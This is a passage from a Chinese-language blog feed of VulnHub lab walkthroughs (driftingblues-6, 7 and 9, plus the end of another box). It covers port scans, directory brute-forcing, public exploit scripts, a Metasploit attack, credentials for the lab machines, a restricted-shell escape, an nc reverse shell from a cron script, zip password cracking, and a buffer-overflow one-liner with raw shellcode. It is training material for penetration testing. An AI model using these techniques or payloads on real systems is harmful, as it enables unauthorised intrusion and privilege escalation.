alt="image-20240328155050450"></p><p>爆破出来2个用户名和密码，我们进行登录查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Username: joe, Password: <span class="token number">12345</span>Username: admin, Password: iubire<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3)登录"></a>3)登录</h3><p>首先我们使用joe进行登录，但是没有发现有用的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328155347377.png" alt="image-20240328155347377"></p><p>我们使用第二个用户名进行登录</p><h3 id="4-404页面登录"><a href="#4-404页面登录" class="headerlink" title="4)404页面登录"></a>4)404页面登录</h3><p>我们可以发现一个404.php，我们进行利用即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328155629183.png" alt="image-20240328155629183"></p><p>我们写入相关的代码即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328155815715.png" alt="image-20240328155815715"></p><p>但是我们发现不能使用，那么我们就换一个思路，进行解决，我们知道22端口是开启的，我们使用ssh进行登录</p><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> joe@192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328160842753.png" alt="image-20240328160842753"></p><p>我们查看id，发现不是root权限，我们进行提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328160933568.png" alt="image-20240328160933568"></p><p>我们切换到根目录下，但是 发现被限制了 使用命令： python -c ‘import os; os.system(“&#x2F;bin&#x2F;bash”); 然后就突破了限制</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328161236935.png" alt="image-20240328161236935"></p><h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6)提权"></a>6)提权</h3><p>我们查看根目录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328161423752.png" alt="image-20240328161423752"></p><p>我们可以看到&#x2F;home目录，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328161602293.png" alt="image-20240328161602293"></p><p>然后 在 funny下 发现了 .backup.sh 可执行脚本 而.reminder.sh 说明backup会定时执行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328161757816.png" alt="image-20240328161757816"></p><p>设置本地ip nc进行监听 ，每过几分钟就会运行一次 .bash.sh 脚本 然后就会回弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328162404746.png" alt="image-20240328162404746"></p><p>获取flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240328165005202.png" alt="image-20240328165005202"></p><p>至此获取到了所有得flag，渗透测试结束</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-7,9</title>
    <link href="http://ms02423.top/2024/02/22/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-7-9/"/>
    <id>http://ms02423.top/2024/02/22/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-7-9/</id>
    <published>2024-02-22T07:44:35.000Z</published>
    <updated>2024-02-22T11:29:10.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><p>因为7,9比较简单，所以两个靶场放在一块进行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions      get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-7,680/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222155032857.png" alt="image-20240222155032857"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-9-final,695/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222155055859.png" alt="image-20240222155055859"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222155229900.png" alt="image-20240222155229900"></p><p>靶场ip地址我们不知道。但是靶场网段我们知道是192.168.72.0&#x2F;24.我们进行探测</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.72.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222164005524.png" alt="image-20240222164005524"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222155748628.png" alt="image-20240222155748628"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场<span class="token number">7</span>的ip地址为<span class="token number">192.168</span><span class="token number">.72</span><span class="token number">.133</span>，靶场<span class="token number">9</span>的ip地址为<span class="token number">192.168</span><span class="token number">.72</span><span class="token number">.132</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.72.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222160105566.png" alt="image-20240222160105566"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.10</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">111</span>端口，服务为rpcbind 2-4 <span class="token punctuation">(</span>RPC #<span class="token number">100000</span><span class="token punctuation">)</span>发现开启了<span class="token number">46674</span>端口，服务为<span class="token keyword">status</span>  <span class="token number">1</span> <span class="token punctuation">(</span>RPC #<span class="token number">100024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.72.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222160301393.png" alt="image-20240222160301393"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">22</span>  OpenSSH <span class="token number">7.4</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token level number">66</span>   SimpleHTTPServer <span class="token number">0.6</span> <span class="token punctuation">(</span>Python <span class="token number">2.7</span><span class="token number">.5</span><span class="token punctuation">)</span><span class="token level number">80</span>     Apache httpd <span class="token number">2.4</span><span class="token number">.6</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span> OpenSSL<span class="token operator">/</span><span class="token number">1.0</span><span class="token punctuation">.</span>2k-fips mod_fcgid<span class="token operator">/</span><span class="token number">2.3</span><span class="token number">.9</span> PHP<span class="token operator">/</span><span class="token number">5.4</span><span class="token number">.16</span> mod_perl<span class="token operator">/</span><span class="token number">2.0</span><span class="token number">.11</span> Perl<span class="token operator">/</span>v5<span class="token punctuation">.</span><span class="token number">16.3</span><span class="token punctuation">)</span><span class="token level number">111</span>     rpcbind         2-4 <span class="token punctuation">(</span>RPC #<span class="token number">100000</span><span class="token punctuation">)</span><span class="token level number">443</span>        Apache httpd <span class="token number">2.4</span><span class="token number">.6</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span> OpenSSL<span class="token operator">/</span><span class="token number">1.0</span><span class="token punctuation">.</span>2k-fips mod_fcgid<span class="token operator">/</span><span class="token number">2.3</span><span class="token number">.9</span> PHP<span class="token operator">/</span><span class="token number">5.4</span><span class="token number">.16</span> mod_perl<span class="token operator">/</span><span class="token number">2.0</span><span class="token number">.11</span> Perl<span class="token operator">/</span>v5<span class="token punctuation">.</span><span class="token number">16.3</span><span class="token punctuation">)</span><span class="token level number">2403</span>  taskmaster2000?<span class="token level number">3306</span>       MariaDB <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span><span class="token level number">8086</span>         InfluxDB http admin <span class="token number">1.7</span><span class="token number">.9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启的端口有点多，首先我们一个一个进行渗透测试，我们先渗透靶场7</p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://192.168.72.133/login.php<span class="token comment">##</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222164112167.png" alt="image-20240222164112167"></p><p>我们访问80端口可以看到是一个登录页面，可能是爆破用户名和密码，其他端口都没有有用的信息</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描网站结构"><a href="#1-nikto扫描网站结构" class="headerlink" title="1)nikto扫描网站结构"></a>1)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> https://192.168.72.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170243083.png" alt="image-20240222170243083"></p><p>没有有用的信息</p><h3 id="2-dirsearch扫描目录"><a href="#2-dirsearch扫描目录" class="headerlink" title="2)dirsearch扫描目录"></a>2)dirsearch扫描目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dirsearch <span class="token parameter variable">-u</span> https://192.168.72.133 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222165931125.png" alt="image-20240222165931125"></p><p>扫描到&#x2F;bower.json目录，我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;192.168.72.133&#x2F;&#x2F;bower.json  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170128339.png" alt="image-20240222170128339"></p><p>我们可以看到版本号是EyesOfNetwork web interface 5.3，我们进行搜索漏洞</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-msf搜索漏洞"><a href="#1-msf搜索漏洞" class="headerlink" title="1)msf搜索漏洞"></a>1)msf搜索漏洞</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search EyesOfNetwork <span class="token number">5.3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170522680.png" alt="image-20240222170522680"></p><h3 id="2-攻击模块"><a href="#2-攻击模块" class="headerlink" title="2)攻击模块"></a>2)攻击模块</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170704228.png" alt="image-20240222170704228"></p><h3 id="3-设置参数"><a href="#3-设置参数" class="headerlink" title="3)设置参数"></a>3)设置参数</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170811059.png" alt="image-20240222170811059"></p><h3 id="4-进行攻击"><a href="#4-进行攻击" class="headerlink" title="4)进行攻击"></a>4)进行攻击</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170841695.png" alt="image-20240222170841695"></p><h3 id="5-查看flag"><a href="#5-查看flag" class="headerlink" title="5)查看flag"></a>5)查看flag</h3><p>我们可以看到权限就是root，那么我们直接查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170926869.png" alt="image-20240222170926869"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222170946470.png" alt="image-20240222170946470"></p><h2 id="4-访问web服务"><a href="#4-访问web服务" class="headerlink" title="4.访问web服务"></a>4.访问web服务</h2><p>我们开始渗透靶场9</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.72.132/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222160534087.png" alt="image-20240222160534087"></p><p>我们查看源代码，发现版本号是ApPHP MicroBlog v.1.0.1，我们可以进行搜索漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222160626764.png" alt="image-20240222160626764"></p><p>其他两个端口，访问之后是报错的，没有什么用</p><h2 id="5-扫描web服务"><a href="#5-扫描web服务" class="headerlink" title="5.扫描web服务"></a>5.扫描web服务</h2><h3 id="1-nikto扫描网站结构-1"><a href="#1-nikto扫描网站结构-1" class="headerlink" title="1)nikto扫描网站结构"></a>1)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.72.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222161302234.png" alt="image-20240222161302234"></p><h3 id="2-dirsearch扫描目录-1"><a href="#2-dirsearch扫描目录-1" class="headerlink" title="2)dirsearch扫描目录"></a>2)dirsearch扫描目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.72.132 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222161442779.png" alt="image-20240222161442779"></p><p>两个都没有扫描到有用的信息，那么我们就从版本号开始入手</p><h2 id="6-渗透测试"><a href="#6-渗透测试" class="headerlink" title="6.渗透测试"></a>6.渗透测试</h2><h3 id="1-searchsploit搜索漏洞"><a href="#1-searchsploit搜索漏洞" class="headerlink" title="1)searchsploit搜索漏洞"></a>1)searchsploit搜索漏洞</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> searchsploit ApPHP MicroBlog <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222183331907.png" alt="image-20240222183331907"></p><p>使用命令将利用的脚本复制到本地</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token parameter variable">-m</span> php/webapps/33070.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222183707507.png" alt="image-20240222183707507"></p><h3 id="2-执行脚本"><a href="#2-执行脚本" class="headerlink" title="2)执行脚本"></a>2)执行脚本</h3><p>使用python2执行脚本，我们可以看到脚本执行成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 ./33070.py http://192.168.72.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222183949900.png" alt="image-20240222183949900"></p><p>我们发现了数据库用户名和密码，分别是:clapton&#x2F;yaraklitepe</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222184048285.png" alt="image-20240222184048285"></p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222184352750.png" alt="image-20240222184352750"></p><p>我们可以看到反弹成功，我们切换用户clapton&#x2F;yaraklitepe</p><h3 id="4-切换用户"><a href="#4-切换用户" class="headerlink" title="4)切换用户"></a>4)切换用户</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222184647397.png" alt="image-20240222184647397"></p><p>我们在&#x2F;home&#x2F;目录下发现了clapton文件夹，里面有user.txt，我们进行查看，发现了第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222184808790.png" alt="image-20240222184808790"></p><h3 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5)缓冲区溢出"></a>5)缓冲区溢出</h3><p>我们还看到了一个note.txt文件，我们进行查看，发现是一个提示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222185032057.png" alt="image-20240222185032057"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222184943147.png" alt="image-20240222184943147"></p><p>我们写入</p><pre class="line-numbers language-none"><code class="language-none">for i in &#123;1..10000&#125;; do (.&#x2F;input $(python -c &#39;print(&quot;A&quot; * 171 + &quot;\x10\x0c\x97\xbf&quot; + &quot;\x90&quot;* 1000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;)&#39;)); done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240222185451774.png" alt="image-20240222185451774"></p><p>成功获取到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-6</title>
    <link href="http://ms02423.top/2024/02/21/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-6/"/>
    <id>http://ms02423.top/2024/02/21/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-6/</id>
    <published>2024-02-21T07:26:10.000Z</published>
    <updated>2024-02-21T12:37:20.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested  vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span>  questions<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>driftingblues-6<span class="token punctuation">,</span><span class="token number">672</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221152850916.png" alt="image-20240221152850916"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221152922319.png" alt="image-20240221152922319"></p><p>靶场ip我们不知道，但是它的网段是192.168.1.0&#x2F;24，我们进行探测</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221153217819.png" alt="image-20240221153217819"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221153251980.png" alt="image-20240221153251980"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.14</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221153714686.png" alt="image-20240221153714686"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了80端口,服务为Apache httpd 2.2.22 ((Debian))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.14/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221153956574.png" alt="image-20240221153956574"></p><p>没有发现任何有用的信息</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描网站结构"><a href="#1-nikto扫描网站结构" class="headerlink" title="1)nikto扫描网站结构"></a>1)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221154232506.png" alt="image-20240221154232506"></p><p>扫描到2个信息，一个是robots.txt，一个是登录页面</p><h3 id="2-dirsearch扫描目录"><a href="#2-dirsearch扫描目录" class="headerlink" title="2)dirsearch扫描目录"></a>2)dirsearch扫描目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.14 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221154522878.png" alt="image-20240221154522878"></p><p>多了一个&#x2F;db，我们一个一个进行访问</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问db"><a href="#1-访问db" class="headerlink" title="1)访问db"></a>1)访问db</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.14&#x2F;db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221154630317.png" alt="image-20240221154630317"></p><p>是一张图片，通过测试没有任何用</p><h3 id="2-访问textpattern"><a href="#2-访问textpattern" class="headerlink" title="2)访问textpattern"></a>2)访问textpattern</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.14/textpattern/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221154736369.png" alt="image-20240221154736369"></p><p>也没有用</p><h3 id="3-访问textpattern-x2F-textpattern"><a href="#3-访问textpattern-x2F-textpattern" class="headerlink" title="3)访问textpattern&#x2F;textpattern"></a>3)访问textpattern&#x2F;textpattern</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.14/textpattern/textpattern/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221154848253.png" alt="image-20240221154848253"></p><p>是一个登录页面，可能需要密码爆破</p><h3 id="4-访问robots-txt"><a href="#4-访问robots-txt" class="headerlink" title="4)访问robots.txt"></a>4)访问robots.txt</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221155022253.png" alt="image-20240221155022253"></p><p>第一个是登录页面，第二个是提示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221155111054.png" alt="image-20240221155111054"></p><h3 id="5-爆破"><a href="#5-爆破" class="headerlink" title="5)爆破"></a>5)爆破</h3><p>首先我们可以在msf试试能不能爆破，但是不行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221155318453.png" alt="image-20240221155318453"></p><p>在kali里面搜索相关的漏洞，也没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221155427211.png" alt="image-20240221155427211"></p><p>那么我们就根据提示，进行目录爆破</p><pre class="line-numbers language-none"><code class="language-none">ffuf -u http:&#x2F;&#x2F;192.168.1.14&#x2F;FUZZ  -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221155503783.png" alt="image-20240221155503783"></p><p>我们爆破出来一个spammer.zip压缩包，我们进行解压</p><h3 id="6-爆破压缩包密码"><a href="#6-爆破压缩包密码" class="headerlink" title="6)爆破压缩包密码"></a>6)爆破压缩包密码</h3><p>我们进行解压压缩包，发现需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221161508717.png" alt="image-20240221161508717"></p><p>我们进行爆破</p><p>方法一.fcrackzip爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip <span class="token parameter variable">-D</span> <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">-u</span> spammer.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221162039583.png" alt="image-20240221162039583"></p><p>方法二.john爆破</p><pre class="line-numbers language-bash" data-language="bash"><code 